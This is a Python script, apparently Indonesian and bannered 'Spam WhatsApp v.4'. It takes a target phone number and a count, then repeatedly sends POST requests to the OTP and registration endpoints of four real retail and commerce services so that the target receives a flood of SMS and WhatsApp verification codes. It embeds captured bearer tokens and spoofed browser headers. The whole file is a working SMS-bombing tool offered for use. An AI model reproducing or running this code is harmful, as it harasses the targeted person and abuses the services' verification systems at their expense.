import os,sys,requests,random,time,json


def mengetik(s):
      for i in s + "\n":
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(random.random() *0.3)


baner="""
\33[0;33m╔══════════════╦══════════════════════════╗
\33[0;33m║➣ \33[0;31mAUTHOR      : AmjadOficial		  \33[0;33m║
\33[0;33m║➣ \33[0;32mYOUTUBE     : AmjadOficial             \33[0;33m║
\33[0;33m║➣ \33[0;37mGITHUB      : AmjadOficial		  \33[0;33m║
\33[0;33m╚══════════════╩══════════════════════════╝
\33[0;37m╔═════════════════════════════════════════╗
\33[0;37m║\t\33[;31mSpam WhatsApp v.4		  \33[0;37m║
\33[0;37m╚═════════════════════════════════════════╝
"""

os.system("clear")
os.system("figlet Tools")
mengetik("\33[0;33mselamat datang di tools by amjad oficial \n\33[0;31mbantu suport youtube gwa ya gaes :)")
os.system("clear")
time.sleep (2)
print (baner)
time.sleep (2)
mengetik("\33[0;35m╔masukan nomor target")
no=input("\33[0;35m╚══➣")
time.sleep (2)
mengetik("\33[0;32m╔masukan jumlah spam")
jum=int(input("\33[0;32m╚═══➣"))
#otten cofe
head1={
"Host":"api.ottencoffee.co.id",
"content-length":"38",
"accept":"application/json, text/plain, */*",
"content-type":"application/json",
"authorization":"Bearer PIxtGSz7OihS9hFmcfBGRrrhRqLjvfmAiRfsB58gDjRgIt2yWnD4EgH7huRd+rnBQ1F6LT2H1beLXOVxNVGYiJoO1q4XnjNSe2L8N5E/s0+MocPvqhV73c/QHiJe9ifxhur18LnmUm72/yqA55eEliMy83XX3nMTFnuxQ7QVYdaSP2o8xMvvtCzasZmkZWr4nGtD8gRgPVeFhX7vfx6xuhk3x8b9nZbn6Q/XCKG2K5y8A8cHM0EiCmbTSOZdjaFiJGx7pgnY0lvA/wAZsSg5JRx/gQ5PqXaFF+gKq30OtXPkDK0y6wHi4k+7d47gA9p+MyJN2+eTteVaTdT13UqdTX7k9ElXicO3+CQzfQ==",
"user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
"origin":"https://ottencoffee.co.id",
"sec-fetch-site":"same-site",
"sec-fetch-mode":"cors",
"sec-fetch-dest":"empty",
"referer":"https://ottencoffee.co.id/register",
"accept-encoding":"gzip, deflate, br",
"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"}
data1=json.dumps({"sentBy":"sms","to":"+62" +no})
for i in range(jum):
   pos=requests.post("https://api.ottencoffee.co.id/v3/auth/register/code/request",headers=head1,data=data1).text
   if "message" in pos:
      mengetik("\33[0;32mSpam ottecoffe berhasil")
   else:
      mengetik("\33[0;31mSpam ottecoffe gagal")

#semartseler
head2={
"Host":"api.smartseller.co.id",
"content-length":"33",
"accept":"application/json, text/plain, */*",
"content-type":"application/json",
"authorization":"Bearer Bearer",
"user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
"origin":"https://app.smartseller.co.id",
"sec-fetch-site":"same-site",
"sec-fetch-mode":"cors",
"sec-fetch-dest":"empty",
"referer":"https://app.smartseller.co.id/",
"accept-encoding":"gzip, deflate, br",
"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"}

data2=json.dumps({"phone_number":"+62" + no})
for i in range(jum):
   pos=requests.post("https://api.smartseller.co.id/api/otp/send",headers=head2,data=data2).text
   if "Berhasil mengirim OTP" in pos:
      mengetik("\33[0;32mSpam smartseler berhasil")
   else:
      mengetik("\33[0;31mSpam semartseler gagal")

#klik indomaret
head3={
"Host":"prd-api.klikindomaret.com",
"content-length":"95",
"content-type":"application/json",
"authorization":"Bearer 803809A98E446CF4BE7D4871BC4FA2C0468D227B",
"user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
"accept":"*/*",
"origin":"https://account.klikindomaret.com",
"sec-fetch-site":"same-site",
"sec-fetch-mode":"cors",
"sec-fetch-dest":"empty",
"referer":"https://account.klikindomaret.com/",
"accept-encoding":"gzip, deflate, br",
"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"}

data3=json.dumps({"MobilePhone":"0" + no,"Method":"SMS","TimeStamp":"09/25/2023 15:23:40","Type":"regist"})
for i in range(jum):
   pos=requests.post("https://prd-api.klikindomaret.com/Account/PreRegistration/Verification",headers=head3,data=data3).text
   if "message" in pos:
      mengetik("\33[0;32mSpam klik indomaret berhasil")
   else:
      mengetik("\33[0;31mSpam klik indonaret gagal")
#mpclub
head4={
"Host":"beryllium.mapclub.com",
"content-length":"25",
"client-timestamp":"1695631440944",
"accept-language":"en-US",
"authorization":"Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiJmYzU3YTBkMC00M2M5LTRjMzktODk3Yi0yZGJmZGNhZTQ5NTMiLCJleHBpcmVkIjoxNjk1NjMzNjQ0NjEwLCJleHBpcmUiOjM2MDAsImV4cCI6MTY5NTYzMzY0NCwiaWF0IjoxNjk1NjMwMDQ0LCJwbGF0Zm9ybSI6IldFQiJ9.QrPq_1zODbiSHwy65iIlMxGqEII1d3aUIcdGgdz_jGYDGJXHdiQWll_1-ntgqCqBGipFK0ZZDfv0kKc3xfff_w",
"user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
"content-type":"application/json",
"accept":"application/json, text/plain, */*",
"origin":"https://www.mapclub.com",
"sec-fetch-site":"same-site",
"sec-fetch-mode":"cors",
"sec-fetch-dest":"empty",
"referer":"https://www.mapclub.com/",
"accept-encoding":"gzip, deflate, br"}

data4=json.dumps({"account":"8" +no })
for i in range(jum):
    pos=requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=WHATSAPP",headers=head4,data=data4).text
    if "success" in pos:
       mengetik("spam mpclub berhasil")
    else:
       mengetik("spam mpclub gagal")

